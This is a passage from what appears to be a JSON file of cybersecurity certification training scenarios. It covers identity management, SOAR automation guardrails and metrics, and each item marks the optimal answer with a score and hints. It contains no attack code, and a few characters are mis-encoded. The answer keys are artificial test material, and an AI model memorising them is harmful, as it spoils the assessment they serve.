            "text": "Delete all service accounts over 1 year old",
            "feedback": "{'short': 'Will cause catastrophic failures', 'detailed': \"Many legitimate service accounts are older than one year. Arbitrary deletion based on age will cause widespread service failures. Age isn't the criteria - legitimate use is. Inventory first to determine which accounts are actually orphaned versus actively used.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Before making changes to 800 service accounts, what do you need to know?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Inventory: what does each account do, who owns it, what permissions does it have, is the service still active? This enables safe remediation."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Identity Threat Detection",
        "situation": "After implementing better controls, you want to detect identity-based attacks. The ransomware attack involved compromised credentials that went undetected. How can you detect credential abuse?\n\n**Question:** What capability is MOST important for detecting credential-based attacks?",
        "options": [
          {
            "id": "A",
            "text": "Failed login alerts",
            "feedback": "{'short': 'Catches brute force but misses successful compromise', 'detailed': 'Failed login alerts detect brute force attempts but: modern attacks use password spraying (few failures per account), compromised credentials log in successfully (no failure), and sophisticated attackers avoid lockouts. Need to detect anomalous successful logins, not just failures.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Behavioral analytics detecting anomalous login patterns and impossible travel",
            "feedback": "{'short': 'Correct! Detect anomalies in successful authentication', 'detailed': 'Behavioral analytics detect: impossible travel (login from NY, then London an hour later), unusual access patterns (new applications, unusual times), and privilege anomalies (unexpected admin actions). These catch compromised credentials even when the login succeeds. The ransomware attack involved successful logins from unusual locations - behavioral analytics would have flagged this.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Mandatory password changes every 30 days",
            "feedback": "{'short': \"Frequent changes don't detect attacks and may weaken security\", 'detailed': \"Frequent password rotation: doesn't detect attacks, leads to weak passwords (Password1, Password2...), and is no longer recommended by NIST. Detection of credential misuse is more valuable than frequent rotation. Modern guidance: strong passwords, MFA, and anomaly detection.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Alert on any admin login",
            "feedback": "{'short': 'High volume of legitimate alerts', 'detailed': 'Alerting on every admin login creates alert fatigue - admins log in legitimately many times per day. Better: alert on anomalous admin activity (unusual times, locations, or target systems). Behavioral baseline for admin accounts, alert on deviations.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Compromised credentials result in successful logins. How do you detect successful but unauthorized access?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Behavioral analytics: baseline normal behavior, detect deviations. Impossible travel, unusual access times, new applications, anomalous privilege use."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Acquisition Integration",
        "situation": "Northwind is acquiring a company with 400 employees. The acquired company has their own AD domain, no MFA, and different applications. Auditors still cite the 340 orphaned accounts from the previous acquisition.\n\n**Question:** What is the MOST important IAM consideration for the acquisition?",
        "options": [
          {
            "id": "A",
            "text": "Immediately migrate all acquired users to Northwind's AD",
            "feedback": "{'short': 'Rushed migration creates more orphaned accounts', 'detailed': \"Rushed integration: creates duplicate accounts, misses application dependencies, and repeats the orphaned account problem. The previous acquisition left 340 orphaned accounts because integration wasn't properly planned. Take time to do it right.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Comprehensive identity inventory before integration, planned migration with reconciliation",
            "feedback": "{'short': 'Correct! Inventory first, then planned integration', 'detailed': 'Acquisition IAM approach: comprehensive inventory of acquired identities before any changes, map acquired accounts to new structure, planned migration with checkpoints, reconciliation to catch orphans, and application access migration. Learn from the previous acquisition - inventory and planning prevent orphaned accounts.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Establish federation between domains and defer integration",
            "feedback": "{'short': \"Federation doesn't address underlying IAM gaps\", 'detailed': \"Federation enables cross-domain access but: doesn't address the acquired company's lack of MFA, doesn't clean up their accounts, and creates permanent dual-domain complexity. Federation can be interim approach but integration should be planned, not deferred indefinitely.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Let the acquired company maintain their own identity systems",
            "feedback": "{'short': 'Creates ongoing security and management issues', 'detailed': 'Separate identity systems: inconsistent security controls (they have no MFA), duplicate identities, complex deprovisioning (terminate in both places), and audit complexity. Integration is necessary for security consistency and operational efficiency.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How did the previous acquisition result in 340 orphaned accounts, and how do you prevent that?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Inventory before integration: know all accounts, map to new structure, planned migration, reconciliation checks. Don't rush and repeat previous mistakes."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "IAM Program Success Metrics",
        "situation": "Robert Walsh asks how you'll measure success of the IAM program. The board wants to know their $1.8M investment is paying off. You need metrics that demonstrate security improvement.\n\n**Question:** What metric BEST demonstrates IAM program effectiveness?",
        "options": [
          {
            "id": "A",
            "text": "Number of accounts created",
            "feedback": "{'short': 'Activity metric, not effectiveness metric', 'detailed': 'Account creation volume measures activity, not security effectiveness. More accounts could mean business growth or could mean poor deprovisioning leaving accounts around. Focus on security outcomes, not transaction volumes.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Time to deprovision, access review completion rate, and privileged account count",
            "feedback": "{'short': 'Correct! These metrics show security improvement', 'detailed': 'Effective IAM metrics: time to deprovision (hours instead of weeks - addresses terminated user risk), access review completion (compliance, privilege reduction), privileged account reduction (smaller attack surface), and MFA adoption rate. These demonstrate the program is reducing the specific risks identified at the start.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "User satisfaction with login experience",
            "feedback": "{'short': 'User experience metric, not security metric', 'detailed': \"User satisfaction is important for adoption but doesn't demonstrate security improvement. The board invested for security, not convenience. Include user experience metrics but focus on security outcomes for demonstrating program value.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Number of helpdesk tickets for access requests",
            "feedback": "{'short': 'Operational metric, not security metric', 'detailed': 'Helpdesk volume is an operational efficiency metric. Fewer tickets might mean better self-service or might mean people are working around the system. Security metrics should show risk reduction, not helpdesk efficiency.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What metrics show the specific security issues are being addressed?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Deprovisioning time (terminated user risk), access review completion (privilege creep), privileged accounts (attack surface), MFA adoption (credential protection)."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D4-SIM-005",
    "title": "Security Automation and Orchestration",
    "domain": 4,
    "type": "SIM",
    "difficulty": "advanced",
    "time_estimate": "45-60 minutes",
    "role": "Security Automation Engineer",
    "organization": {
      "name": "Sentinel Insurance Group",
      "industry": "Insurance/Financial Services"
    },
    "introduction": "Sentinel Insurance Group's SOC is drowning in manual work. Every alert requires the same repetitive steps: lookup the user, check the asset, query threat intel, create a ticket, document findings. Analysts are burning out on copy-paste workflows while real threats wait in queue. James Park has secured budget for a SOAR platform and brought you in to architect the automation program. The tools are ready - now you need to decide what to automate, how to automate it safely, and how to measure success. Where do you start?",
    "learning_objectives": [
      "Explain the purpose of mitigation techniques used to secure the enterprise",
      "Explain security alerting and monitoring concepts and tools",
      "Explain appropriate incident response activities"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Automation Starting Point",
        "situation": "You have a SOAR platform and dozens of potential use cases. Analysts want help with everything, but you need to prioritize. Some want automated containment immediately; others want basic enrichment first.\n\n**Question:** What should be the FIRST automation use case to implement?",
        "options": [
          {
            "id": "A",
            "text": "Automated endpoint isolation for malware alerts",
            "feedback": "{'short': 'High-risk action too early - need to build trust first', 'detailed': \"Automated containment is valuable but risky to start with. If automation makes a mistake isolating a critical system, you'll lose organizational trust. Start with lower-risk automation to prove value and accuracy before moving to containment actions.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Alert enrichment - automatically add context to all alerts",
            "feedback": "{'short': 'Correct! Low-risk, high-value, builds foundation', 'detailed': 'Alert enrichment is ideal first use case: low risk (read-only, no actions taken), high value (saves 35% of analyst time), high visibility (every analyst benefits immediately), and foundation for future automation (enrichment data feeds into decision-making). Prove value with enrichment, then expand to actions.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Full phishing response automation including containment",
            "feedback": "{'short': 'Too complex for first playbook', 'detailed': 'Full phishing automation involves multiple integrations (email, proxy, threat intel), containment actions, and many edge cases. Better to start simpler, prove the platform works, then tackle complex workflows. Phishing is a great second or third playbook.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Automated ticket creation for all alerts",
            "feedback": "{'short': 'Valuable but less impactful than enrichment', 'detailed': 'Ticket creation saves time (25% of analyst work) but creates less analyst value than enrichment. An auto-created ticket without context still requires manual lookups. Enrichment + ticket creation together is powerful, but enrichment alone provides more value.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What automation is low-risk (read-only) but high-value for analysts?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Alert enrichment: automatically adds asset, user, and threat intel context. Read-only (safe), benefits every alert, saves 35% of analyst time."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Containment Automation Risk",
        "situation": "After successful enrichment automation, leadership wants to automate containment - blocking IPs, isolating hosts, disabling accounts. Some analysts are nervous about automated actions causing outages.\n\n**Question:** How should containment automation be approached?",
        "options": [
          {
            "id": "A",
            "text": "Fully automate all containment - speed is critical in incident response",
            "feedback": "{'short': 'Too risky - automation errors can cause major disruption', 'detailed': 'Full automation for containment risks isolating critical systems based on false positives, blocking legitimate services, or taking actions during sensitive business hours. Speed is important but not at the cost of reliability. Graduated approach is safer.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Risk-based approach: auto-execute low-risk actions, require approval for high-risk",
            "feedback": "{'short': 'Correct! Balance speed with safety using risk-based automation', 'detailed': 'Risk-based containment: low-risk actions (block external IPs, quarantine email) can be fully automated, medium-risk actions (disable user, block domain) automated with guardrails (allowlists, thresholds), and high-risk actions (isolate servers, mass actions) require human approval. This balances speed with safety.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "No automated containment - always require human approval",
            "feedback": "{'short': 'Misses automation value for clear-cut cases', 'detailed': \"Requiring approval for everything defeats the purpose of SOAR. Blocking a known-malicious external IP is low risk and shouldn't need human approval. The goal is to automate what's safe to automate while preserving human judgment for ambiguous or high-impact decisions.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Automate during business hours only, manual after hours",
            "feedback": "{'short': \"Doesn't address the actual risk factors\", 'detailed': \"Time of day isn't the primary risk factor - the nature of the action is. A false positive isolation is bad at 2 PM or 2 AM. Risk-based approach addresses what makes actions safe or risky, not when they occur.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you automate safe actions while protecting against high-impact mistakes?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Risk-based: categorize actions by impact. Low-risk = full automation. Medium-risk = automation with guardrails. High-risk = human approval required."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Phishing Playbook Design",
        "situation": "Phishing is the highest-volume alert type (450/day). You're designing the phishing response playbook. The team wants to automate as much as possible while maintaining accuracy.\n\n**Question:** What's the BEST approach for automated phishing classification?",
        "options": [
          {
            "id": "A",
            "text": "Fully automated classification - machine learning determines malicious/benign",
            "feedback": "{'short': 'ML alone has false positive risk', 'detailed': 'Pure ML classification will have false positives that lead to blocking legitimate emails or senders. ML is valuable for scoring, but clear-cut cases should be handled by deterministic rules, and ambiguous cases should go to humans. Hybrid approach is better.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Scoring system: auto-classify high-confidence cases, human review for ambiguous",
            "feedback": "{'short': 'Correct! Automate the clear-cut, escalate the ambiguous', 'detailed': 'Hybrid approach: enrichment feeds into scoring (known bad indicators, sandbox results, reputation), high-confidence malicious (score > threshold) auto-classified and contained, high-confidence benign auto-closed, and ambiguous (middle scores) queued for human review. This automates the majority while preserving human judgment for edge cases.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "All classification requires human review - automation only assists",
            "feedback": "{'short': 'Misses opportunity to automate clear-cut cases', 'detailed': 'Requiring human review for every email means 450 manual reviews per day. Many phishing emails are clearly malicious (known bad URLs, failed sandbox). Automate the obvious cases to free analysts for the genuinely ambiguous ones.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Auto-classify based on sender reputation only",
            "feedback": "{'short': 'Single factor is insufficient', 'detailed': 'Sender reputation alone misses many attack types: compromised legitimate senders, new domains, spoofing. Effective classification needs multiple factors: sender reputation, URL analysis, attachment analysis, and content indicators. Single-factor classification has high error rates.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can automation handle obvious cases while preserving human judgment for difficult ones?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Scoring system: multiple enrichment factors feed into score. High-confidence (clear malicious/benign) automated. Ambiguous scores go to human review."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Integration Security",
        "situation": "The SOAR platform needs to integrate with multiple systems: SIEM, EDR, email, Active Directory, firewalls. Each integration requires authentication credentials. IT security is concerned about credential management.\n\n**Question:** What is the MOST important security consideration for SOAR integrations?",
        "options": [
          {
            "id": "A",
            "text": "Use personal admin accounts for integrations - easier to manage",
            "feedback": "{'short': 'Personal accounts create accountability and security issues', 'detailed': 'Personal accounts for automation: no accountability (who did what?), credentials tied to individual (employee leaves = broken integrations), potential for misuse, and violates least privilege. Always use dedicated service accounts.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Dedicated service accounts with least privilege and credential vaulting",
            "feedback": "{'short': 'Correct! Service accounts with proper controls', 'detailed': 'Integration security: dedicated service accounts (clear accountability, survive employee turnover), least privilege (only permissions needed for specific automation), credential vaulting (secrets managed securely, not in plaintext), regular rotation, and audit logging of all automated actions.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Single master account with full admin access to all systems",
            "feedback": "{'short': 'Violates least privilege - excessive risk', 'detailed': \"Single account with full admin: if compromised, attacker has access to everything. SOAR doesn't need full admin - it needs specific permissions for specific actions. Separate service accounts per integration with least privilege limits blast radius.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "API keys stored in the SOAR platform configuration",
            "feedback": "{'short': 'Better than plaintext but proper vaulting is preferred', 'detailed': 'Storing API keys in platform config is better than plaintext files but: SOAR platforms have their own vulnerabilities, keys should be in dedicated secrets management, and rotation should be automated. Use proper credential vaulting (HashiCorp Vault, Azure Key Vault) when possible.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What type of accounts should be used for automation, and how should credentials be managed?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Dedicated service accounts (not personal), least privilege (only needed permissions), credential vaulting (secrets management), audit logging."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Playbook Testing Strategy",
        "situation": "You've built a new malware response playbook that can isolate infected endpoints. Before production deployment, you need to validate it works correctly and won't cause problems.\n\n**Question:** What is the BEST approach to testing the playbook before production?",
        "options": [
          {
            "id": "A",
            "text": "Deploy to production and monitor closely",
            "feedback": "{'short': 'Testing in production risks real-world impact', 'detailed': 'Production testing with containment actions risks isolating legitimate systems, disrupting business operations, and losing organizational trust in automation. Test thoroughly before production deployment.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Test with synthetic data, then run in shadow mode before enabling actions",
            "feedback": "{'short': 'Correct! Progressive testing builds confidence', 'detailed': \"Playbook testing progression: development testing with synthetic data (verify logic), shadow mode (run against real alerts, log what WOULD happen but don't act), comparison (validate shadow decisions match what analysts would do), and then production enablement. This catches issues before they impact production.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Test only with known malware samples",
            "feedback": "{'short': 'Misses edge cases and false positive scenarios', 'detailed': 'Testing only positive cases misses: false positives (legitimate software triggering detection), edge cases (unusual environments), and failure scenarios (what if integration is down?). Test both positive and negative cases.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Have analysts review the playbook code",
            "feedback": "{'short': \"Code review is helpful but doesn't replace functional testing\", 'detailed': \"Code review catches logic errors but doesn't validate real-world behavior. Integrations may behave differently than expected, edge cases may not be obvious in code, and performance issues only appear in testing. Review AND test.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you validate a playbook works correctly without risking production impact?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Progressive testing: synthetic data testing \u00e2\u2020\u2019 shadow mode (log actions without executing) \u00e2\u2020\u2019 validate against analyst decisions \u00e2\u2020\u2019 production enablement."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Enrichment Performance",
        "situation": "The enrichment playbook queries 8 different sources for every alert. Some queries are slow, causing enrichment to take 30+ seconds. Analysts are complaining about delays.\n\n**Question:** How should enrichment performance be optimized?",
        "options": [
          {
            "id": "A",
            "text": "Remove slow sources - speed is more important than context",
            "feedback": "{'short': 'Loses valuable context', 'detailed': 'Removing enrichment sources reduces the value of automation. Threat intel might be slow but is critical context. Better to optimize the process while keeping valuable sources.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Execute enrichment queries in parallel with timeout handling",
            "feedback": "{'short': 'Correct! Parallel execution and graceful degradation', 'detailed': \"Performance optimization: execute all enrichment queries in parallel (don't wait for one to finish before starting next), set timeouts for each source (don't let one slow source delay everything), graceful degradation (continue without failed source, note it's missing), and caching (reuse recent results for same IOCs).\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Run enrichment in background and notify analyst when complete",
            "feedback": "{'short': \"Async helps but doesn't optimize the enrichment itself\", 'detailed': \"Background processing helps analyst workflow but enrichment still takes 30+ seconds. Parallel execution addresses the actual bottleneck. Background processing can complement parallel execution but shouldn't replace it.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only enrich high-severity alerts",
            "feedback": "{'short': 'Low-severity alerts also benefit from context', 'detailed': \"All alerts benefit from enrichment - a low-severity alert with context might be quickly closed (saving analyst time) or might reveal it's actually higher severity. Enrich everything but optimize performance.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "If you're querying 8 sources sequentially, how could you reduce total time?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Parallel execution: query all sources simultaneously. Timeouts: don't wait forever for slow sources. Caching: reuse recent results."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Automated Containment Guardrails",
        "situation": "You're implementing automated IOC blocking. The playbook will automatically block malicious IPs at the firewall. You need to prevent the automation from blocking something critical.\n\n**Question:** What is the MOST important guardrail for automated blocking?",
        "options": [
          {
            "id": "A",
            "text": "Require analyst approval for every block",
            "feedback": "{'short': 'Defeats the purpose of automation', 'detailed': 'Requiring approval for every block means analysts must review each one - not much different from manual blocking. The goal is to automate safe blocks automatically while protecting against high-risk mistakes. Targeted guardrails are better than blanket approval requirements.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Allowlist of critical IPs/domains that are never auto-blocked",
            "feedback": "{'short': 'Correct! Protect critical assets from automation mistakes', 'detailed': 'Allowlist guardrail: maintain list of IPs/domains that are NEVER automatically blocked (critical infrastructure, major business partners, cloud services, etc.). If automation tries to block an allowlisted entity, alert human for review instead. This prevents catastrophic mistakes while allowing automation for non-critical entities.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Only block IPs, never domains",
            "feedback": "{'short': 'Arbitrary restriction that misses the actual risk', 'detailed': \"Domains can be just as safe or risky to block as IPs. The risk isn't IP vs. domain - it's whether it's critical to the business. Blocking malicious.evil.com is low risk; blocking your cloud provider's domain is high risk regardless of format.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Limit to 10 blocks per hour",
            "feedback": "{'short': \"Rate limiting doesn't prevent blocking something critical\", 'detailed': \"Rate limiting prevents mass blocks but doesn't prevent blocking the one critical IP that's on block number 1. A guardrail needs to identify WHAT shouldn't be blocked, not just HOW MANY. Rate limits can complement allowlists but not replace them.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What would prevent automation from blocking something business-critical?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Allowlist: maintain list of critical IPs/domains (cloud providers, partners, internal infrastructure). Never auto-block allowlisted entities - escalate to human review instead."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Measuring Automation Success",
        "situation": "Three months into the SOAR implementation, James Park asks for metrics to justify the investment to the board. He wants to show concrete ROI on the $800K investment.\n\n**Question:** What metric BEST demonstrates SOAR value to leadership?",
        "options": [
          {
            "id": "A",
            "text": "Number of playbooks deployed",
            "feedback": "{'short': 'Activity metric, not outcome metric', 'detailed': 'Playbook count measures activity, not value. 50 playbooks that rarely run provide less value than 5 high-volume playbooks. Leadership cares about outcomes (time saved, risk reduced), not activity (playbooks built).'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Analyst hours saved and MTTR reduction with cost translation",
            "feedback": "{'short': 'Correct! Quantified value in terms leadership understands', 'detailed': \"SOAR ROI metrics: analyst hours saved (time automation reclaimed \u00c3\u2014 analyst cost = $ saved), MTTR reduction (faster response = less damage/exposure), and coverage (percentage of alerts handled automatically). Translate to business terms: 'Automation saves 120 analyst hours/week ($X/year) and reduced average response time from 45 minutes to 8 minutes.'\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Alert volume processed by automation",
            "feedback": "{'short': \"Volume doesn't indicate value\", 'detailed': \"Processing volume shows automation is running but not whether it's providing value. 10,000 alerts enriched means nothing if enrichment doesn't improve analyst decisions or save time. Connect volume to outcomes.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Integration uptime percentage",
            "feedback": "{'short': 'Operational metric, not value metric', 'detailed': \"Integration uptime is important for operations but doesn't demonstrate value to leadership. High uptime on low-value automation is still low value. Focus on outcomes delivered.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What metrics translate automation benefits into terms leadership cares about?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Time saved (hours \u00c3\u2014 analyst cost = $ saved), MTTR reduction (faster response = lower risk), and automation rate (% handled without human). Translate to business impact."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Analyst Adoption",
        "situation": "Some analysts are enthusiastic about automation, but others are resistant. One senior analyst says 'automation will make mistakes and I'll be blamed' and refuses to use the playbooks.\n\n**Question:** How should analyst resistance to automation be addressed?",
        "options": [
          {
            "id": "A",
            "text": "Mandate playbook use and discipline non-compliance",
            "feedback": "{'short': 'Forcing adoption creates resentment and workarounds', 'detailed': 'Mandating use without addressing concerns creates: resentment, workarounds (analysts bypass automation), lack of feedback for improvement, and blame culture if something goes wrong. Adoption requires addressing legitimate concerns.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Involve analysts in playbook design and address accountability concerns",
            "feedback": "{'short': 'Correct! Involvement drives adoption and improves quality', 'detailed': 'Address resistance through: involving analysts in playbook design (they know the edge cases), clear accountability model (automation is a tool, not a replacement - analysts still make key decisions), transparent logging (see what automation did and why), easy override capability (analysts can intervene), and celebrating wins (show how automation helps, not threatens).'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Let resistant analysts work manually while others use automation",
            "feedback": "{'short': \"Creates inconsistent processes and doesn't address concerns\", 'detailed': 'Split approaches create: inconsistent incident response, difficulty measuring automation value, and continued resistance from influential team members. Address the concerns to get everyone on board, which also surfaces legitimate issues with the automation.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Remove human override capability to ensure automation is used",
            "feedback": "{'short': 'Dangerous - removes safety valve', 'detailed': \"Human override is a critical safety mechanism. Removing it: creates risk when automation is wrong, removes accountability, and signals analysts aren't trusted. The goal is augmenting analysts, not replacing their judgment.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can analysts become advocates for automation rather than resisters?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Involvement: analysts design playbooks, address their concerns (accountability, overrides), show them the value (time saved on repetitive work). Adoption follows understanding."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Automation Failure Handling",
        "situation": "A playbook failed overnight: the threat intel integration was down, so enrichment returned no data. The automation classified several phishing emails as benign (low threat score due to missing intel) and closed them. Two were actually malicious.\n\n**Question:** How should automation failures like this be prevented?",
        "options": [
          {
            "id": "A",
            "text": "Disable automation when any integration is unavailable",
            "feedback": "{'short': 'Too aggressive - minor outages would stop all automation', 'detailed': 'Disabling all automation for any integration failure is overkill. Some integrations are more critical than others, and temporary failures are common. Better to handle failures gracefully within the playbook logic.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Build failure awareness into playbook logic - flag when key data is missing",
            "feedback": "{'short': 'Correct! Graceful degradation with human escalation for uncertainty', 'detailed': \"Failure-aware automation: detect when critical enrichment sources fail, adjust confidence accordingly (missing threat intel = lower confidence), escalate to human review when data is incomplete rather than auto-deciding with insufficient information, and alert operations about integration issues. 'I don't have enough information' should trigger human review, not auto-closure.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Add redundant threat intel sources",
            "feedback": "{'short': \"Helps with this specific failure but doesn't address the general problem\", 'detailed': 'Redundant sources help availability but: any source can fail, cost adds up for redundancy everywhere, and this specific failure would still happen if all threat intel was down. The playbook logic needs to handle missing data gracefully.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Have an analyst review all automation decisions",
            "feedback": "{'short': 'Defeats the purpose of automation', 'detailed': \"Reviewing every decision eliminates the efficiency gain of automation. The goal is smart automation that knows when it's confident and when it needs human help - not human review of everything.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How should automation behave when it doesn't have complete information?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Failure-aware logic: detect missing/failed data sources, reduce confidence when data is incomplete, escalate to human when uncertain rather than guessing."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D5-REM-001",
    "title": "Policy and Governance Fundamentals",
    "domain": 5,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": 25,
    "role": "Junior Security Analyst",
    "organization": {
      "name": "Coastal Credit Union",
      "industry": "Financial Services",
